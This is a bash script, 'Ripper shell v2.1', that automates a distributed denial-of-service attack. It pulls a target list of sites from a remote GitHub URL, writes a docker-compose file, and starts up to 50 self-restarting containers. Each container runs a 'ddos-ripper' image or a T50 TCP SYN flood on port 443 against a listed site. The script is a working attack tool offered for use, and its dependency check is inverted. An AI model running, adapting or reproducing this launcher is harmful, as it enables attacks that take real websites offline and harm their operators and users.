#!/bin/bash
# Ripper shell v2.1
# 1.0 - initial script (uses local urls.txt file)
# 2.0 - added external mirror for url list
# 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)

VERSION='2.1'
TARGETS_URL='https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'

function print_help {
  echo -e "Usage: os_x_ripper.sh --mode install"
  echo -e "--mode|-m   - runmode (install, reinstall, start, stop)"
  echo -e "--number|-n - number of containers to start"
}

function print_version {
  echo $VERSION
}

function check_dependencies {
  if $(docker -v | grep "Docker"); then
    echo "Please install docker first. https://www.docker.com/products/docker-desktop"
    exit 1
  fi
}

function check_params {
  if [ -z ${mode+x} ]; then
    echo -e "Mode is unset, setting to install runmode"
    mode=install
  fi
}

function install_t50 {
  curl https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/T50.Dockerfile --output T50.Dockerfile
  docker build -f T50.Dockerfile -t t50 .
  rm T50.Dockerfile
}

function generate_compose {
    if [ -z ${amount} ]; then
        echo -e "Amount of containers not set, setting to maximum of 50"
        amount=50
    fi

    echo -e "version: '3'" > docker-compose.yml
    echo -e "services:" >> docker-compose.yml
    counter=1


    # T50 is pretty heavy, I am not sure how many containers we should allow
    MAX_T50=5
    
    while read -r site_url; do
        if [ $counter -le $amount ]; then
            if [ ! -z $site_url ]; then
                # t50 is only used if we don't have slashes in the path: just domain names
                if [ 0 -le $MAX_T50 ] && [[ "$site_url" != *\/* ]] && [[ "$site_url" != *\\* ]]; then
                  echo -e "  ddos-runner-t50-$MAX_T50:" >> docker-compose.yml
                  echo -e "    image: t50" >> docker-compose.yml
                  echo -e "    restart: always" >> docker-compose.yml
                  echo -e "    privileged: true" >> docker-compose.yml
                  echo -e "    command: t50 $site_url --flood -S --protocol TCP --turbo --dport 443" >> docker-compose.yml
                  ((MAX_T50--))
                else
                  echo -e "  ddos-runner-$counter:" >> docker-compose.yml
                  echo -e "    image: nitupkcuf/ddos-ripper:latest" >> docker-compose.yml
                  echo -e "    restart: always" >> docker-compose.yml
                  echo -e "    command: $site_url" >> docker-compose.yml
                  ((counter++))
                fi
            fi
        fi
    done < targets.txt
}

function ripper_start {
  echo "Starting ripper attack"
  docker-compose up -d
}

function ripper_stop {
  echo "Stopping ripper attack"
  docker-compose down
}

while test -n "$1"; do
  case "$1" in
  --help|-h)
    print_help
    exit
    ;;
  --mode|-m)
    mode=$2
    shift
    ;;
  --number|-n)
    amount=$2
    shift
    ;;
  *)
    echo "Unknown argument: $1"
    print_help
    exit
    ;;
  esac
  shift
done

curl --silent $TARGETS_URL | jq -r '.[]' > targets.txt

check_dependencies
check_params

case $mode in
  install)
    generate_compose
    ripper_start
    ;;
  start)
    ripper_start
    ;;
  stop)
    ripper_stop
    ;;
  reinstall)
    ripper_stop
    generate_compose
    ripper_start
    ;;
  *)
    echo "Wrong mode"
    exit 1
esac
